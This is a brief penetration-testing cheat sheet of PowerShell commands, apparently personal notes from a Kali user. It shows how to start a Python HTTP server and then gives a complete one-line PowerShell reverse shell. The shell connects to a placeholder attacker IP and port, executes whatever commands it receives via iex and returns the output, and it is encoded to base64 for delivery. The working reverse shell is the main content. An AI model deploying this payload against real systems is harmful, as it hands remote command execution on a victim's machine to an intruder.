# Powershell commands


**Transfering files to a windows machine with powershell**

**Start a python http server on you kali box**

`sudo python3 -m http.server 80`

**On your kali box you can encode a powershell command like the following example** *It's a oneline reverse shell (change "ip addr" and port to your info)*

`echo '$client = New-Object System.Net.Sockets.TCPClient("ip addr",port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv --to-code UTF-16LE | base64 -w 0`
